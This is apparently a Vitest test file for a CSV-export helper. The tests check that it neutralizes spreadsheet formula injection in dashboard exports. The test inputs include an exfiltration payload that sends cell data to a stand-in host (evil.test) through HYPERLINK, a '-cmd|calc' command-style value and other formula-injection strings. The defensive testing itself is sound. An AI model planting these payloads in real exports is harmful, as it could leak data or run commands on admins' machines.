import { describe, expect, it } from 'vitest'

import { csvCell, toCsv } from '../helpers/csv.js'

/**
 * CSV injection (CWE-1236). The dashboard exports carry values a low-privileged
 * editor writes — a page title, a meta description, a focus keyword — and an admin
 * opens the file in Excel or LibreOffice. Quoting is not protection: the spreadsheet
 * strips the quotes before deciding whether the cell is a formula.
 */
describe('csvCell — spreadsheet formula neutralization', () => {
  it('prefixes every leading character a spreadsheet reads as a formula', () => {
    expect(csvCell('=1+1')).toBe(`"'=1+1"`)
    expect(csvCell('+1')).toBe(`"'+1"`)
    expect(csvCell('@SUM(A1)')).toBe(`"'@SUM(A1)"`)
    expect(csvCell('\tcmd')).toBe(`"'\tcmd"`)
    expect(csvCell('\rcmd')).toBe(`"'\rcmd"`)
  })

  it('neutralizes the exfiltration payload an editor can store in a meta title', () => {
    expect(csvCell('=HYPERLINK("https://evil.test/?d="&A2,"Ouvrir")')).toBe(
      `"'=HYPERLINK(""https://evil.test/?d=""&A2,""Ouvrir"")"`,
    )
  })

  it('still quotes and doubles the quotes of ordinary text', () => {
    expect(csvCell('Une "citation", et une virgule')).toBe(`"Une ""citation"", et une virgule"`)
    expect(csvCell('Guide SEO 2026')).toBe('"Guide SEO 2026"')
  })

  it('keeps plain numbers numeric — a negative metric is not a formula', () => {
    expect(csvCell(-3)).toBe('"-3"')
    expect(csvCell('-2.5')).toBe('"-2.5"')
    expect(csvCell('-2,5')).toBe('"-2,5"')
    // …but a lone dash, or a dash followed by text, is text.
    expect(csvCell('-')).toBe(`"'-"`)
    expect(csvCell('-cmd|calc')).toBe(`"'-cmd|calc"`)
  })

  it('renders null and undefined as an empty field', () => {
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
  })

  it('serializes a whole table, header row included', () => {
    expect(toCsv([['title', 'score'], ['=cmd', 92]])).toBe('"title","score"\n"\'=cmd","92"')
  })
})
